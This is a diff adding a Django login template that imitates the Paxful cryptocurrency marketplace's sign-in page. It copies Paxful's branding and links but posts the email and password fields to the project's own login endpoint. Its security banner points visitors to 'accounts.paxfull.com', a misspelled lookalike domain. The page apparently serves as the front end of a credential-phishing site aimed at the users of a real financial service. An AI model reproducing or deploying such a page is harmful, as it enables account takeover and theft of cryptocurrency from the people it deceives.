@@ -1,0 +1,74 @@
+{% load static %}
+<!DOCTYPE html>
+<html>
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <link rel="stylesheet" href="{%static 'style.css'%}">
+
+    <link href="/static/dist/vendors.chunk.css?c=6d4312572de9d33c9855" rel="stylesheet" />
+        <link href="/static/dist/main.593036ead6f2ace2ad4b.css" rel="stylesheet" />
+        <link
+            rel="stylesheet"
+            href="https://fonts.googleapis.com/css?family=Montserrat:400,500,700|Open+Sans:400,600,700&display=swap&subset=cyrillic"
+        />
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.jss">
+    <script src="{%static 'index.js'%}" defer></script>
+</head>
+<body>
+    <div class="col-2">
+    <form method= "POST" action={%url 'login' %} id="login-form">
+        {% csrf_token %}
+        <div class="form-box">
+            <div class="box1">
+                <a href="https://paxful.com/"><img width="125px" height="100px" src="{%static 'Images/logo.png'%}"></a>
+            </div>
+            <div class="box2">
+                <div class="img-container">
+                    <img id="ln-icon" width="14px" height="14px" src="{%static 'Images/global2.png'%}">
+                    <select id="select-ln">
+                        <option>English</option>
+                        <option>French</option>
+                     </select>
+              </div>      
+            </div>
+            </div>
+        <div class="form-body" style="margin-left: 25px;">
+        <p id="login-ttl">Log In With Paxful</p>
+        <div class="info">
+            <div class="col-3"><i id="info-circle" class="fa fa-info-circle"></i></div>
+            <div class="col-3"> 
+                <p id="info-p">IMPORTANT! Please check<br> that you are 
+                visiting<br> https://accounts.paxfull.com/</p>
+            </div>
+
+            <div class="col-3">
+                <p id="info-p2"><i style="color: green; margin-right: 2px; font-size: 10px;" 
+                    class="fa fa-lock"></i><span style="color: green; margin:0;">https://</span><span id="restof-link">accounts.paxfull.com</span></p>
+            </div>
+              
+        </div>
+        <p class="form-txts">Your Phone or Email</p>
+        <input id="input-field" type="email"  name="email" required>
+        <br>
+        <p class="form-txts">Your Password<a id="f-pass" href="https://paxful.com/forgot-password?locale=en">Forgot password?</a></p>
+        <div class="input-field2">
+            <input id="passwd" type="password" name="password" required>
+            <span class="toggle-password"><i id="eye-icon" class="fa fa-eye"></i></span>
+        </div>
+        <br>
+        <button type="submit" id="login-btn">Log in
+            <i style="padding-left: 320px; font-size: 10px;"  class="fa fa-chevron-right"></i>
+        </button> 
+        <hr id="hr1">
+        <p id="reg-p">New on Paxful? <a href="https://paxful.com/register?locale=en">Create an Account</a></p>
+        </div>
+    </form>
+    </div>
+
+    <div class="col-22">
+        <img src="{%static 'Images/firstBackground.png'%}">
+    </div>
+</body>
+</html> 
